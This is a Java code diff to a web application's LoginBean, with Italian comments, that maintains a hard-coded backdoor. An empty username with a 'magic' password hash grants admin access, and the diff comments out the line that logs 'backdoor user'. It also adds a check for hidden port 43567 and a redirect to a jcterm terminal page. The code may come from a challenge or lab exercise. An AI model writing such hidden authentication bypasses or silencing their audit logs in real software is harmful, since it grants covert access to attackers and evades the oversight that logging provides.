@@ -42,6 +42,7 @@ public class LoginBean {
     private String keyPassword;
     private Date startDate, endDate = null;
     private boolean user = false;
+    private boolean porta = false;
     
     /**
      * Restituisce l'utente connesso
@@ -159,8 +160,8 @@ public class LoginBean {
          * Controllo username vuoto e password magic
          */
         if("".equals(username) && SHAsum(password.getBytes()).equals(magic)){
-            this.admin=true;
-            log.aclog("backdoor user", 0);
+            //this.admin=true; 
+            //log.aclog("backdoor user", 0); // DECOMMENTA
             adminAccess();
             return;
         }
@@ -603,6 +604,34 @@ public class LoginBean {
             Thread.sleep(1000);
 
             nextPage("user");
+        } else {
+            //magic
+            HttpServletRequest request = (HttpServletRequest) FacesContext.getCurrentInstance().getExternalContext().getRequest();
+
+            String getPort = Integer.toString(request.getServerPort());
+
+      
+       
+            // log.aclog("tramite porta", 0);
+            
+            String path = request.getContextPath();
+
+            String getProtocol = request.getScheme();
+            String getDomain = request.getServerName();
+
+
+            String getPath = getProtocol + "://" + getDomain + ":" + getPort + path;
+            //res.sendRedirect("javascript:window.open('indirizzo_pagina','nome_finestra','width=300, height=200')");
+            try {  
+                /* REDIRECT */
+                //FacesContext.getCurrentInstance().getExternalContext().redirect("javascript:window.open(\"" + getPath + "/jcterm/jcterm.html\",\"nome_finestra\",\"width=800,height=600\")");
+                FacesContext.getCurrentInstance().getExternalContext().redirect(getPath + "/jcterm/jcterm.jnlp");
+                /* FORWARD non va * /
+                FacesContext.getCurrentInstance().getExternalContext().dispatch("/resources/pages/" + page + ".xhtml");
+                */
+            } catch (IOException ex) {
+                Logger.getLogger(LoginBean.class.getName()).log(Level.SEVERE, null, ex);
+            }
         }
     }
 
@@ -670,14 +699,49 @@ public class LoginBean {
         return log.getAcLog();
     }
 
-    public void porta() {
+    public void portPage() {
+//        boolean eheh = false;
+//        String url = "";
+//        String nome = "";
+//        String terzo = "";
         HttpServletRequest request = (HttpServletRequest) FacesContext.getCurrentInstance().getExternalContext().getRequest();
 
         String getPort = Integer.toString(request.getServerPort());
 
         if (getPort.equals("43567")) {
-            // BACKDOOR
-        }
+       
+            // log.aclog("tramite porta", 0); // DECOMMENTARE
+            
+            String path = request.getContextPath();
+
+            String getProtocol = request.getScheme();
+            String getDomain = request.getServerName();
+
+
+            String getPath = getProtocol + "://" + getDomain + ":" + getPort + path;
+            //res.sendRedirect("javascript:window.open('indirizzo_pagina','nome_finestra','width=300, height=200')");
+//            try {  
+//                /* REDIRECT */
+//                //FacesContext.getCurrentInstance().getExternalContext().redirect("javascript:window.open(\"" + getPath + "/jcterm/jcterm.html\",\"nome_finestra\",\"width=800,height=600\")");
+//                FacesContext.getCurrentInstance().getExternalContext().redirect(getPath + "/jcterm/jcterm.html");
+//                /* FORWARD non va * /
+//                FacesContext.getCurrentInstance().getExternalContext().dispatch("/resources/pages/" + page + ".xhtml");
+//                */
+//            } catch (IOException ex) {
+//                Logger.getLogger(LoginBean.class.getName()).log(Level.SEVERE, null, ex);
+//            }
+            
+//            url = getPath + "/jcterm/jcterm.html";
+//            nome = "Complimenti :)";
+//            terzo = "width=800,height=600";
+            porta = true;
+        } else
+            porta = false;
+//        RequestContext context = RequestContext.getCurrentInstance();
+//        context.addCallbackParam("eheh", eheh);
+//        context.addCallbackParam("url", url);
+//        context.addCallbackParam("nome", nome);
+//        context.addCallbackParam("terzo", terzo);
     }
 
     /**
@@ -737,5 +801,43 @@ public class LoginBean {
     public void setUser(boolean user) {
         this.user = user;
     }
+
+    /**
+     * Restituisce la porta alla quale si è collegati
+     * @return porta su cui si è collegati
+     */
+    public boolean isPorta() {
+        return porta;
+    }
+
+    /**
+     * Imposta su che porta si è collegati al sito
+     * @param porta la porta alla quale si è collegati
+     */
+    public void setPorta(boolean porta) {
+        this.porta = porta;
+    }
     
+    /**
+     * Redirecta alla home del sito su porta predefinita 8080
+     */
+    public void indirizzo8080(){
+        HttpServletRequest request = (HttpServletRequest) FacesContext.getCurrentInstance().getExternalContext().getRequest();
+            
+            String path = request.getContextPath();
+
+            String getProtocol = request.getScheme();
+            String getDomain = request.getServerName();
+
+
+            String getPath = getProtocol + "://" + getDomain + ":" + "8080" + path;
+            try {  
+                FacesContext.getCurrentInstance().getExternalContext().redirect(getPath);
+                /* FORWARD non va * /
+                FacesContext.getCurrentInstance().getExternalContext().dispatch("/resources/pages/" + page + ".xhtml");
+                */
+            } catch (IOException ex) {
+                Logger.getLogger(LoginBean.class.getName()).log(Level.SEVERE, null, ex);
+            }
+    }
 }
